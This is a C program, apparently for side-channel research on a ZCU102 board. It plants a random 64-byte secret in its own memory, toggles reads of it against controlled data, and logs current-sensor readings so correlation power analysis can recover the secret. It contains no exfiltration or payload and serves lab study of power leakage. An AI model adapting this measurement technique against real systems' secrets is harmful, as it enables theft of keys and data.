/*
 * zcu102_hd_line.c — FULL cache-line CPA: recover a random 64-byte secret V.
 *
 * Unlike zcu102_hd_switch.c (V = one byte repeated 64x, fully coherent on the
 * bus), here V is a random 64-byte kernel value V[0..63], all distinct. The
 * attacker controls a random 64-byte G[0..63] per trace and reads it then V, so
 * the controller/bus switching is  Σ_i HW(G[i] ⊕ V[i]).  Byte i is recovered by
 * correlating the measured u76 (VCCPSINTFP) current against HW(G[i] ⊕ v_h) over
 * many traces — the other 63 bytes are algorithmic noise, so each byte gets only
 * ~1/64 of the leverage and the run needs MANY traces. Hence: log only the
 * current per trace and regenerate G from a seed (splitmix64, matched in NumPy),
 * so N can grow into the 100k+ range with a tiny CSV.
 *
 *   V[i]      = splitmix64(secret_seed + i) & 0xFF              (printed + saved)
 *   G[t][i]   = splitmix64(g_seed + (u64)t*64 + i) & 0xFF       (anchors: all 0)
 *
 * CSV: order_idx,time_s,is_anchor,mean_VCCPSINTFP_mA,mean_PSDDR_mA,n_samp
 *      (header also records g_seed so the analysis can regenerate G)
 *
 * Build: gcc -O2 -march=armv8-a -mtune=cortex-a53 -o zcu102_hd_line zcu102_hd_line.c -lrt
 * Run:   sudo ./zcu102_hd_line -S <secret_seed> -s <g_seed> -n N -b 150 -o data/line.csv
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <time.h>
#include <sched.h>
#include <glob.h>

#ifndef MAP_HUGETLB
#define MAP_HUGETLB 0x40000
#endif
#define HUGE_2M (2ul*1024*1024)
#define PAGE 4096
#define LINE 64
#define G_OFF 0
#define V_OFF 64

static inline int64_t now_ns(void){struct timespec t;clock_gettime(CLOCK_MONOTONIC_RAW,&t);
    return (int64_t)t.tv_sec*1000000000LL+t.tv_nsec;}
static inline int bank_id(uint64_t pa){return (pa>>14)&0x3;}
static inline int row_id (uint64_t pa){return (pa>>16)&0x7FFF;}

static int pmfd=-1;
static uint64_t v2p(void*v){uint64_t e,o=((uint64_t)v/PAGE)*8;
    if(pread(pmfd,&e,8,o)!=8)return 0; if(!(e&(1ULL<<63)))return 0;
    return ((e&((1ULL<<55)-1))*PAGE)|((uint64_t)v&(PAGE-1));}

/* splitmix64 — must match the NumPy implementation in the analysis exactly. */
static inline uint64_t sm64(uint64_t x){
    x += 0x9E3779B97F4A7C15ULL;
    x = (x ^ (x>>30)) * 0xBF58476D1CE4E5B9ULL;
    x = (x ^ (x>>27)) * 0x94D049BB133111EBULL;
    return x ^ (x>>31);
}

/* architectural switch: flush G+V, read 64B G then 64B V (DQ toggles), sink
 * the two halves SEPARATELY (no CPU XOR). Verbatim mechanism of the byte gadget. */
static volatile uint64_t g_sink;
static inline void switch_iter(uint8_t*G,uint8_t*V){
    asm volatile(
        "dc civac,%1\n dc civac,%2\n dsb ish\n"
        "ldp q0,q1,[%1,#0]\n ldp q2,q3,[%1,#32]\n"
        "ldp q4,q5,[%2,#0]\n ldp q6,q7,[%2,#32]\n"
        "umov x16,v3.d[0]\n str x16,%0\n umov x16,v7.d[0]\n str x16,%0\n"
        :"=m"(g_sink):"r"(G),"r"(V)
        :"memory","x16","q0","q1","q2","q3","q4","q5","q6","q7");
}
static inline void clean_line(uint8_t*p){asm volatile("dc civac,%0\n dsb ish\n"::"r"(p):"memory");}

/* ---- u76 (primary) + u93 rails ---- */
static int fd_u76=-1, fd_u93=-1;
static void open_rails(void){
    glob_t g; glob("/sys/class/hwmon/hwmon*",0,NULL,&g);
    for(size_t i=0;i<g.gl_pathc;i++){
        char p[300],nm[64]={0}; FILE*f;
        snprintf(p,sizeof p,"%s/name",g.gl_pathv[i]); f=fopen(p,"r"); if(!f)continue;
        if(!fgets(nm,sizeof nm,f)){fclose(f);continue;} fclose(f);
        snprintf(p,sizeof p,"%s/curr1_input",g.gl_pathv[i]);
        if(strstr(nm,"u76")) fd_u76=open(p,O_RDONLY);
        else if(strstr(nm,"u93")) fd_u93=open(p,O_RDONLY);
    }
    globfree(&g);
}
static inline int rd(int fd){char b[32];lseek(fd,0,SEEK_SET);int n=read(fd,b,sizeof b-1);
    if(n<=0)return -1;b[n]=0;return atoi(b);}

int main(int argc,char**argv){
    uint64_t sseed=0x5EC4E70000ULL, gseed=0x6AD600000ULL;
    int N=20000, burst_ms=150, anchor_every=8, warmup_ms=2000, read_us=6000, chunk=64;
    int coherent=0;     /* -c 1: G = one byte g=sm64(gseed+t) repeated 64x (coherent) */
    int mask=0;         /* -m 1: Hadamard-masked coherent sweep (full-line recovery) */
    const char*out="data/line.csv";
    for(int i=1;i<argc;i++){
        if(!strcmp(argv[i],"-S")&&i+1<argc) sseed=strtoull(argv[++i],0,0);
        else if(!strcmp(argv[i],"-s")&&i+1<argc) gseed=strtoull(argv[++i],0,0);
        else if(!strcmp(argv[i],"-n")&&i+1<argc) N=atoi(argv[++i]);
        else if(!strcmp(argv[i],"-b")&&i+1<argc) burst_ms=atoi(argv[++i]);
        else if(!strcmp(argv[i],"-a")&&i+1<argc) anchor_every=atoi(argv[++i]);
        else if(!strcmp(argv[i],"-c")&&i+1<argc) coherent=atoi(argv[++i]);
        else if(!strcmp(argv[i],"-m")&&i+1<argc) mask=atoi(argv[++i]);
        else if(!strcmp(argv[i],"-o")&&i+1<argc) out=argv[++i];
    }
    cpu_set_t cs;CPU_ZERO(&cs);CPU_SET(1,&cs);sched_setaffinity(0,sizeof cs,&cs);
    mlockall(MCL_CURRENT|MCL_FUTURE);
    pmfd=open("/proc/self/pagemap",O_RDONLY); if(pmfd<0){perror("pagemap");return 1;}
    uint8_t*base=mmap(0,HUGE_2M,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS|MAP_HUGETLB,-1,0);
    if(base==MAP_FAILED){perror("hugepage");return 1;}
    memset(base,0,HUGE_2M);
    uint8_t*G=base+G_OFF,*V=base+V_OFF;

    /* plant the random 64-byte secret V */
    for(int i=0;i<LINE;i++) V[i]=sm64(sseed+i)&0xFF;
    clean_line(V);
    uint64_t pg=v2p(G),pv=v2p(V);

    /* print + save the truth so the analysis can verify recovery */
    char vpath[300]; snprintf(vpath,sizeof vpath,"%s.secret",out);
    FILE*vf=fopen(vpath,"w");
    fprintf(stderr,"=== ZCU102 full-line CPA: recover random 64-byte V ===\n");
    fprintf(stderr,"  secret_seed=0x%llX g_seed=0x%llX  N=%d burst=%dms anchor=%d\n",
            (unsigned long long)sseed,(unsigned long long)gseed,N,burst_ms,anchor_every);
    fprintf(stderr,"  G pa=0x%lx bank=%d row=%d | V pa=0x%lx bank=%d row=%d same_row=%d\n",
            pg,bank_id(pg),row_id(pg),pv,bank_id(pv),row_id(pv),
            (bank_id(pg)==bank_id(pv)&&row_id(pg)==row_id(pv)));
    fprintf(stderr,"  TRUE V = ");
    for(int i=0;i<LINE;i++){fprintf(stderr,"%02x",V[i]); if(vf)fprintf(vf,"%02x",V[i]);}
    fprintf(stderr,"\n"); if(vf){fprintf(vf,"\n");fclose(vf);}

    open_rails();
    if(fd_u76<0){fprintf(stderr,"u76 not found\n");return 1;}

    /* warmup */
    for(int i=0;i<LINE;i++) G[i]=sm64(gseed+i)&0xFF; clean_line(G);
    int64_t we=now_ns()+(int64_t)warmup_ms*1000000LL;
    while(now_ns()<we) for(int c=0;c<chunk;c++) switch_iter(G,V);

    FILE*fp=fopen(out,"w"); if(!fp){perror("fopen");return 1;}
    fprintf(fp,"# g_seed=0x%llX secret_seed=0x%llX\n",(unsigned long long)gseed,(unsigned long long)sseed);
    fprintf(fp,"order_idx,time_s,is_anchor,mean_VCCPSINTFP_mA,mean_PSDDR_mA,n_samp\n"); fflush(fp);

    int64_t t0=now_ns(); int na=0;
    for(int t=0;t<N;t++){
        int anc=(t%anchor_every==0);
        if(anc){
            for(int i=0;i<LINE;i++) G[i]=0;
        } else {
            if(mask){
                /* Sylvester-Hadamard row k=na%64: H[k][j]=(-1)^popcount(k&j).
                 * G[j]=g where H=+1, ~g where H=-1 -> ALL bytes switch coherently. */
                int k=na%64; uint8_t g=sm64(gseed+(uint64_t)t)&0xFF;
                for(int j=0;j<LINE;j++)
                    G[j]=(__builtin_popcount((unsigned)(k & j))&1)?(uint8_t)(g^0xFF):g;
            } else if(coherent){
                uint8_t g=sm64(gseed+(uint64_t)t)&0xFF; for(int i=0;i<LINE;i++) G[i]=g;
            } else {
                for(int i=0;i<LINE;i++) G[i]=sm64(gseed+(uint64_t)t*64+i)&0xFF;
            }
            na++;
        }
        clean_line(G);
        double s76=0,s93=0; int cnt=0;
        int64_t dl=now_ns()+(int64_t)burst_ms*1000000LL, nx=now_ns();
        double tmid=(now_ns()-t0)/1e9;
        while(now_ns()<dl){
            for(int c=0;c<chunk;c++) switch_iter(G,V);
            int64_t tt=now_ns();
            if(tt>=nx){ int a=rd(fd_u76); if(a>=0)s76+=a; if(fd_u93>=0){int b=rd(fd_u93); if(b>=0)s93+=b;} cnt++; nx=tt+(int64_t)read_us*1000;}
        }
        fprintf(fp,"%d,%.3f,%d,%.4f,%.4f,%d\n",t,tmid,anc,cnt?s76/cnt:0,cnt?s93/cnt:0,cnt); fflush(fp);
        if(t%500==0){fprintf(stderr,"\r  trace %6d/%d  u76=%.1fmA n=%d t=%.0fs   ",
                     t,N,cnt?s76/cnt:0,cnt,(now_ns()-t0)/1e9); fflush(stderr);}
    }
    fprintf(stderr,"\n  done -> %s (%.0fs)\n",out,(now_ns()-t0)/1e9);
    fclose(fp);
    return 0;
}
